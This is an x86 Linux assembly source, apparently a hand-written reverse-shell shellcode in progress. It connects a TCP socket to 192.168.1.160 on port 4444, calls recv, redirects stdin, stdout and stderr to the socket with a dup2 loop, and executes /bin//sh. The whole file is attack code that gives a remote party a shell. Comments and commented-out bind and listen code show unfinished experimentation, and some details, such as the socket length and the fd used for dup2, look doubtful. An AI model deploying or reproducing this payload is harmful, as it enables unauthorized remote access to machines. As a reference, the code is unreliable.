
global _start

section .text

_start :

%assign AF_INET 2
%assign  SYS_SOCKET 1; sys_socket = 1 
%assign SOCK_STREAM 1 ; Connection TCP 
%assign SYS_BIND 2; sys_bind = 2
%assign SYS_LISTEN 4; sys_ listen =4
%assign SYS_ACCEPT 5; socket
%assign SYS_CONNECT 3;sys_connect = 3
%assign SYS_RECV 10; sys_recv=10
	xor eax,eax
	mov al,0x66 ; syscall - socketcall
	mov bl, SYS_SOCKET ; type sys_socket
	; socket(domain,type,protocol)
	xor edx,edx
	push edx ; protocol
	push SOCK_STREAM ; type
	push AF_INET ; domain 2
	mov ecx, esp

	int 0x80
	mov esi,eax
;connect
	xor eax,eax
	xor ebx,ebx
	mov al,0x66 ;102
	mov bl, SYS_CONNECT
	; connect (sockfd, struct sockaddr * addr, socklen_t addrlen)
	; connect (eax [4444,2,127.0.0.1],??)

	; build struct sockaddr
;	push word 0x2e31
;	push word 0x3030
;	push w;;60 ;0x2e30 ;0x3130 
;	push word 0001 ;0x3030 ;0x2e30 
;	push 0x313638 ;168; 0x2e37
	 push 0xa001a8c0 ;192;0x3132 ;0x3231;'  ;1270.0.1
	push word 0x5c11; port 4444 DEC -> HEX, little endian
	push word AF_INET ; 
	mov ecx,esp

	;build connect
	push byte 0x12; ;used to be 0x10 length ...need to figure out how to calculate
	push ecx ; point er to sockaddr
	mov edi,esi ; copy fd
	push esi ; fd

	mov ecx,esp ; make pointer to args into ecx

	int 0x80
;recv
;recv(sockfd,outbuf,len,flag)
;recv(3,e??,20,0)
	mov al, 102
	mov bl,SYS_RECV ; 10
	push edx; value can be 0
	push 20; malength
	push esp ;output location
	push  esi ; fd

	int 0x80
;listen
; listen(sockfd,int backlog)
	;mov esi,edi ; copy fd to esi
	;mov eax, 102
	;mov ebx, SYS_LISTEN ; 4
	;push 0 ; backlog
	;push esi ;  fd =3
	;mov ecx,esp
	;int 0x80

;accept
; accept(sockfd,struct sockaddr,*socklen)
	;mov eax,102
	;mov ebx, SYS_ACCEPT
	;push 0
	;push 0
	
	;push esi ; fd=3
	;mov ecx,esp
	;int 0x80
; redirect to STDIN
;exec shell

mov ebx,eax ;return value is in eax, is the new FD! ...had to fix this to make it work
xor ecx,ecx
; dup2 (old,new)
; dup2(ebx,ecx++)
builddup:
	mov al,0x3f ; dup2 63 system call
	int 0x80
	inc ecx
	cmp cl,0x4

	jne builddup
xor eax,eax
push  eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
;push  eax
;push ebx
;mov ecx,edx
mov ecx,edx
mov edx,eax ; 0
mov al, 0xb
int 0x80
